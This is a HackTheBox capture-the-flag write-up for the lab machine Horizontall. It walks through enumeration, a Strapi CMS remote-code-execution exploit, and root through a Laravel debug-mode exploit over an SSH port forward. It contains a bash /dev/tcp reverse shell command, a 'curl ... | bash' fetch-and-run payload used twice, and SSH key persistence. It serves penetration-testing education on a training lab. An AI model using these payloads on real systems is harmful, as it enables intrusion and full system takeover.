---
title: HTB Horizontall - Writeup
date: "2022-01-04"
draft: false
tags: ["hackthebox", "machines", "cve", "", "writeup"]
---

# Enumeration

Before we start enumeration, let's add IP `10.10.11.105` to `/etc/hosts` as `horizontall.htb`

*/etc/hosts*:
```bash
10.10.11.105    horizontall.htb
```

## Initial Scans

Nmap Scan

```nmap
# Nmap 7.91 scan initiated Thu Dec 30 19:29:02 2021 as: nmap -vv --reason -Pn --min-rate=10000 -sV -sC --version-all -oN /home/fakebatman/CTFs/htb/machines/horizontall/results/horizontall.htb/scans/_quick_tcp_nmap.txt -oX /home/fakebatman/CTFs/htb/machines/horizontall/results/horizontall.htb/scans/xml/_quick_tcp_nmap.xml horizontall.htb
Increasing send delay for 10.10.11.105 from 0 to 5 due to 223 out of 743 dropped probes since last increase.
Warning: 10.10.11.105 giving up on port because retransmission cap hit (10).
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up, received user-set (0.046s latency).
Scanned at 2021-12-30 19:29:02 EST for 13s
Not shown: 995 closed ports
Reason: 995 conn-refused
PORT     STATE    SERVICE REASON      VERSION
22/tcp   open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp   open     http    syn-ack     nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1BA2AE710D927F13D483FD5D1E548C9B
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 19:29:15 2021 -- 1 IP address (1 host up) scanned in 13.57 seconds
```

- Only port 22, 80 are open

### ffuf scans

```bash
$ ffuf -u http://horizontall.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -ic -of html -o f_big.html

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Output file      : f_big.html
 :: File format      : html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

img                     [Status: 301, Size: 194, Words: 7, Lines: 8]
                        [Status: 200, Size: 901, Words: 43, Lines: 2]
css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
js                      [Status: 301, Size: 194, Words: 7, Lines: 8]
                        [Status: 200, Size: 901, Words: 43, Lines: 2]
:: Progress: [220547/220547] :: Job [1/1] :: 1422 req/sec :: Duration: [0:02:57] :: Errors: 0 ::
```

- No interesting directories/files found.
- Going through the source code also did not yield anything interesting, so I had to dive deeper.

### Diving deeper into source code

- The source code has link to various JS files. So taking a look at those, one file `http://horizontall.htb/js/app.c68eb462.js`
- Search through those files for `http://` links, hoping to find some interesting sub directory / sub domain, I found `api-prod` subdomain.

![](/img/horizontall/Pasted%20image%2020211230200846.png)

### Fuzzing for directories on `api-prod`

Before we fuzz, let's add IP `10.10.11.105` to `/etc/hosts` as `api-prod.horizontall.htb`

*/etc/hosts*:
```bash
10.10.11.105    horizontall.htb api-prod.horizontall.htb
```


```bash
$ ffuf -u http://api-prod.horizontall.htb/FUZZ -ic -c -w /usr/share/wordlists/dirb/common.txt -of html -o f_api_prod_common.html

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://api-prod.horizontall.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Output file      : f_api_prod_common.html
 :: File format      : html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 413, Words: 76, Lines: 20]
admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
Admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
ADMIN                   [Status: 200, Size: 854, Words: 98, Lines: 17]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1]
index.html              [Status: 200, Size: 413, Words: 76, Lines: 20]
robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4]
reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1]
users                   [Status: 403, Size: 60, Words: 1, Lines: 1]
:: Progress: [4614/4614] :: Job [1/1] :: 1055 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

`/admin` stands out. Visiting admin reveals that it is housing a login page for CMS called `strapi` at http://api-prod.horizontall.htb/admin/auth/login
![](/img/horizontall/Pasted%20image%2020220103200012.png)
### Checking for vulnerabilities

Visiting `/admin/init` we get version number. Version: `"strapiVersion":"3.0.0-beta.17.4"`

![](/img/horizontall/Pasted%20image%2020220103200143.png)

This version is vulnerable to RCE. (Source: https://www.exploit-db.com/exploits/50239)

Downloading and running the exploit:

```bash
$ python3 50239.py http://api-prod.horizontall.htb/
```

![](/img/horizontall/Pasted%20image%2020220103195637.png)

This exploit let's us run commands on system. Let's try to get a reverse shell.

### Getting a reverse shell

We setup a netcat listener on port 443 (`sudo nc -nlvp 443`). Our normal payload does not work and does not yield a shell. 

Payload:
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.115/443 0>&1"
```

![](/img/horizontall/Pasted%20image%2020220103201451.png)

So pasting this command to a file `shell.sh` and running a Simple HTTP server in that directory using `sudo python3 -m http.server 80`

Then we try to `curl` our shell.sh and pipe over to bash so that `bash` can execute our `shell.sh` and give us a reverse shell.

```bash
$ curl http://10.10.14.13/shell.sh | bash
```

![](/img/horizontall/Pasted%20image%2020220103202111.png)

and we get a reverse shell

![](/img/horizontall/Pasted%20image%2020220103202213.png)

And then we can get the `user.txt` flag.

![](/img/horizontall/Pasted%20image%2020220103202251.png)

# Post Exploit Enumeration
#### Active ports

![](/img/horizontall/Pasted%20image%2020211230205004.png)

#### Logging in SSH

Inside `~` (/opt/strapi), we can make `.ssh` directory and add our public key, so that we can login using SSH instead of running the exploit again and again.

```bash
strapi@horizontall:~$ ls -la | grep .ssh
ls -la | grep .ssh
drwx------  2 strapi strapi 4096 Jan  3 23:39 .ssh
```

Generate keys (can be on our local machine)

```bash
strapi@horizontall:~/.ssh$ ssh-keygen -f id_rsa
```

Then we have two files:

```bash
strapi@horizontall:~/.ssh$ ssh-keygen -f id_rsa
ssh-keygen -f id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Generating public/private rsa key pair.
Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:DAAaCnPxTt07FSQ7UePvcADqdlsJjJMRz05hCC75Rb0 strapi@horizontall
The key\'s randomart image is:
+---[RSA 2048]----+
|+ +oo.++*o=      |
|o= + +.@.B o     |
|o o + O X.+      |
|   = o *E= +     |
|    o o S + o    |
|     . . + +     |
|        .   .    |
|                 |
|                 |
+----[SHA256]-----+
```

Copying the contents of `id_rsa.pub` to `authorized_keys`

```bash
strapi@horizontall:~/.ssh$ cat id_rsa.pub >> authorized_keys
cat id_rsa.pub > authorized_keys

strapi@horizontall:~/.ssh$ ls -l
ls -l
total 12
-rw-rw-r-- 1 strapi strapi  400 Jan  4 19:17 authorized_keys
-rw------- 1 strapi strapi 1675 Jan  4 19:17 id_rsa
-rw-r--r-- 1 strapi strapi  400 Jan  4 19:17 id_rsa.pub
```

Changing the permissions of the files:

```bash
strapi@horizontall:~/.ssh$ chmod 600 authorized_keys
chmod 600 authorized_keys
strapi@horizontall:~/.ssh$ chmod 600 id_rsa
chmod 600 id_rsa
strapi@horizontall:~/.ssh$ chmod 600 id_rsa.pub
chmod 600 id_rsa.pub
```

And then we `cat` the `id_rsa` file and copy it to our local machine. Then, we change the permission of that file as well.

```bash
$ chmod 600 id_rsa
```

#### Checking for open ports

We can check for ports open on the machine using this command.

```bash
strapi@horizontall:~/$ ss -tulpn
```

![](/img/horizontall/Pasted%20image%2020220103203944.png)

There is port 8000 open (internally) and it hosts a website. Since we cannot access it externally, we will use SSH to forward our queries to this port


#### Local port forwarding using SSH

The following commands forwards all the requests on our localhost and port 9000 to the remote host  -> horizontall.htb:8000.

```bash
$ ssh -L 9000:localhost:8000 -i id_rsa strapi@horizontall.htb
```

Checking for open ports on our local machine and we can see that we have port 9000 open

![](/img/horizontall/Pasted%20image%2020220103204750.png)

So when we visit http://localhost:9000, all the requests would be forwarded to http://horizontall.htb:8000/

# Privilege Escalation

#### Remote Port 8000 - Enumeration

The version that is running is: `Laravel v8 (PHP v7.4.18)`

![](/img/horizontall/Pasted%20image%2020220104145122.png)

#### Looking for exploits

The version `Laravel v8 (PHP v7.4.18)` is vulnerable to RCE if it is running in debug more. More about RCE [here](https://www.ambionics.io/blog/laravel-debug-rce)

There is exploit available for this RCE at exploit-db.com -> (https://www.exploit-db.com/exploits/49424)

#### Exploiting Laravel

*Before we start exploiting, let's see if this is actually vulnerable ie if this still runs in debug mode.*

Sending a GET request to -> `http://localhost:9000/_ignition/execute-solution` -> reveals that debug mode is ON. That means this is exploitable.

![](/img/horizontall/Pasted%20image%2020220104132325.png)

We gonna download the RCE from exploit-db. (https://www.exploit-db.com/exploits/49424) and run it.

We will be using the `shell.sh` file we created to get the user shell and use it to get the root shell as well. Setting up reverse shell on port 443 as `sudo nc -nlvp 443`

Running the exploit:
```bash
$ python3 49424.py http://localhost:9000 /home/developer/myproject/storage/logs/laravel.log 'curl http://10.10.14.49/shell.sh | bash'
```

And we get a shell on our listener. We are root. Yay!

![](/img/horizontall/Pasted%20image%2020220104145749.png)
